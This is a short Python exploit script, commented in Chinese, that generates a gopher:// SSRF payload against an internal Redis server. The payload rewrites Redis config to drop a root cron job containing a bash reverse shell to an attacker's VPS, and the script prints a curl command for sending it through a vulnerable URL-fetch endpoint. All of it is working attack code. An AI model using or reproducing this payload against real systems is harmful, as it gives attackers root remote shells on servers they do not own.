#!/usr/bin/env python3
"""生成 gopher:// payload 打内网 Redis（写 cron 反弹）"""
import sys, urllib.parse

def resp(*args):
    out = b'*%d\r\n' % len(args)
    for a in args:
        a = a if isinstance(a, bytes) else str(a).encode()
        out += b'$%d\r\n%s\r\n' % (len(a), a)
    return out

def build(vps, port='9001'):
    cron = '\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n' % (vps, port)
    p = b''
    p += resp('CONFIG', 'SET', 'dir', '/var/spool/cron')
    p += resp('CONFIG', 'SET', 'dbfilename', 'root')
    p += resp('SET', 'x', cron)
    p += resp('SAVE')
    return 'gopher://127.0.0.1:6379/_' + urllib.parse.quote(p)

if __name__ == '__main__':
    prefix = sys.argv[1] if len(sys.argv) > 1 else 'http://TARGET/fetch?url='
    vps = sys.argv[2] if len(sys.argv) > 2 else '<VPS>'
    g = build(vps)
    print(g)
    print('# 用法: curl -sS --get "%s" --data-urlencode "url=%s"' % (prefix.split('=', 1)[0] + '=', g))
